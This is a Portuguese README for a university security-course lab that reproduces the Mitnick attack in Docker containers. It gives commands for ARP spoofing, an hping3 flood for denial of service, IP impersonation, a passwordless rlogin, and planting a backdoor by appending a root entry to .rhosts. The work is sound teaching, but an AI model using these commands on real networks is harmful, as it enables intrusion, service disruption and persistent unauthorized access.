# Mitnick Attack

## Contexto

Este é o trabalho para a disciplina de Segurança Computacional da Universidade Federal do Paraná. O objetivo é reproduzir o ataque de Kevin Mitnick e demonstrar que é possível obter acesso a uma rede interna sem a necessidade de um ataque de força bruta.

## [Entendendo o ataque de Mitnick](https://seedsecuritylabs.org/Labs_16.04/PDF/Mitnick_Attack.pdf)

***

## Entendendo nossa versão do ataque

### estrutura geral

Nossa topologia consistirá de 3 containers docker:
    1. [attacker](attacker/Dockerfile)
    2. [trusted_server](trusted-server/Dockerfile)
    3. [x-terminal](xterminal/Dockerfile)

Os três containers estão na mesma rede e conseguem se enxergar. Entretanto, existe uma relação de confiança entre o trusted_server e o x-terminal. O x-terminal é um terminal que só pode ser acessado, sem a necessidade de senha, a partir do trusted_server.

O sistema de acesso remoto será feito usando rlogin.

### usuários

A máquina x-terminal possui um usuário chamado "fontoura" com senha "fontoura".

### attacker

A máquina attacker é uma máquina que está tentando acessar o x-terminal. Ela não tem acesso direto ao x-terminal mas tem acesso a rede interna.

### trusted_server

A máquina trusted_server é uma máquina que tem acesso direto ao x-terminal. Ela é a única máquina que pode acessar o x-terminal.

A largura de banda do trusted_server é limitada, para simular uma interface de rede lenta e sucetível a ataques de negação de serviço.

### Ataque

O ataque será feito em quatro etapas:
    1. [Arp Spoofing](./Readme.md#realizando-o-arp-spoofing)
    2. [Negação de serviço](./Readme.md#realizando-a-negação-de-serviço)
    3. [Personificação](./Readme.md#realizando-a-personificação)
    4. [Invadindo](./Readme.md#invadindo)
    5. [Backdoor](./Readme.md#backdoor)
***

## Requisitos

- docker
- docker compose

***

## Como executar

1. Iniciando as máquinas

    ```bash
    docker-compose up -d
    ```

2. Acessando as máquinas

    Para acessar cada uma das máquinas. Em três terminais diferentes, execute os seguintes comandos, um em cada terminal:

    ```bash
    docker exec -it trusted_server bash
    docker exec -it attacker bash
    docker exec -it victim bash
    ```

3. Realizando o arp spoofing

    Para realizar o arp spoofing, execute o seguinte comando no terminal do attacker:

    ```bash
    arpspoof -i eth0 -t 172.28.1.2 172.28.1.3
    ```

    O comando acima faz com que o attacker se passe pelo trusted_server para o x-terminal. Envenenando a tabela arp do x-terminal.

    É possível verificar que o arp spoofing foi realizado com sucesso executando o seguinte comando no terminal do x-terminal:

    ```bash
    arp -a
    ```

    Podemos ver que o trusted-server está na tabela arp do x-terminal com o endereço MAC do attacker.

4. Realizando a negação de serviço

    Para realizar a negação de serviço, execute o seguinte comando no terminal do attacker:

    ```bash
    hping3 --flood --rand-source 172.28.1.3
    ```

    O comando fará um flood de pacotes no trusted_server. O objetivo é saturar a largura de banda do trusted_server, fazendo com que ele não consiga mais responder as requisições do x-terminal ou se comunicar com a rede.

5. Realizando a personificação

    Para realizar a personificação, iremos mudar o IP do attacker para o IP do trusted_server. Para isso, execute o seguinte comando no terminal do attacker:

    ```bash
    ifconfig eth0 172.28.1.3
    ```

    Agora, o attacker está se passando pelo trusted_server para o x-terminal.

    Para verificar que a personificação foi realizada com sucesso, podemos tentar realizar o login sem senha em x-terminal. A partir do attacker, execute o seguinte comando:

    ```bash
    rlogin -l fontoura x-terminal
    ```

    O comando acima tentará realizar o login no x-terminal. Como o attacker está se passando pelo trusted_server, o login será realizado com sucesso e o usuário fontoura será logado no x-terminal sem a necessidade de uma senha.

6. configurando o backdoor

    Para abrir a conexão através do rlogin ao x-terminal para o attacker, execute o seguinte comando no terminal do x-terminal:

    ```bash
    echo '172.28.1.4 root' >> /home/fontoura/.rhosts

***

## Roadmap

- [X] colocar as maquinas na mesma rede
- [X] derrubar o trusted server
- [X] personificar ip e mac do trusted server
- [X] fazer rlogin no x-terminal através do attacker
- [ ] conferir se os pacotes estão sendo enviados para o trusted server
- [ ] fechar o x-terminal para ser acessado apenas pelo trusted server
- [ ] fazer o backdoor de forma que fique aberto para toda a rede
